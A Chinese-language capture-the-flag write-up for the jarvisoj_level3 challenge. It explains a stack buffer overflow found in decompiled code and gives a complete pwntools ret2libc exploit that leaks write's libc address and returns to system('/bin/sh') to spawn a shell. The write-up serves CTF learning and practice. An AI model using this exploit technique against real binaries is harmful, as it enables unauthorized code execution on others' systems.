jarvisoj_level3

思路

简单的栈溢出泄露write函数真实地址计算基址然后返回mian函数重新构造rop链打就可以getshell了
题目链接：https://buuoj.cn/challenges#jarvisoj_level3

代码审计

ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  write(1, "Input:\n", 7u);
  return read(0, buf, 0x100u);
}


直接看ida pro反编译的伪c代码很容易发现有栈溢出，read函数读取0x100个字节到buf里但是实际定义的buf大小没有那么大那么多的数据会溢出。
由于题目里没有给system函数和"/bin/sh"那我们可以通过泄露write函数地址来计算基址通过构造rop链去打就可以getshell简单的ret2libc3

EXP

EXP1 加载本地LIBC

# -*- coding: UTF-8 -*-
#by 小渔xiaoyu
from pwn import*
from LibcSearcher import *
context(os='linux', arch='i386', log_level='debug')
elf = ELF('./level3')
sh = elf.process()
#sh = remote('node4.buuoj.cn','26109')
#gdb.attach(sh)
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.sym['main']
print('write_plt:',hex(write_plt))
print('write_got',hex(write_got))

#leak write addr
payload = ""
payload += "A"*0x88+"BBBB"
payload += p32(write_plt)
payload += p32(main_addr)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)
sh.recvuntil('Input:\n')
sh.sendline(payload)
write_addr = u32(sh.recv(4))
print(hex(write_addr))
#libc
libc = ELF('./libc-2.23.so')
libcbase = write_addr-libc.sym['write']
system_addr = libc.sym['system']+libcbase
str_bin_sh = libc.search('/bin/sh\x00').next()+libcbase
print(libcbase)
#getshell
payload =""
payload += 'A'*0x88+"BBBB"
payload += p32(system_addr)
payload += p32(0)
payload += p32(str_bin_sh)
sh.recvuntil('Input:\n')
sh.sendline(payload)
sh.interactive()
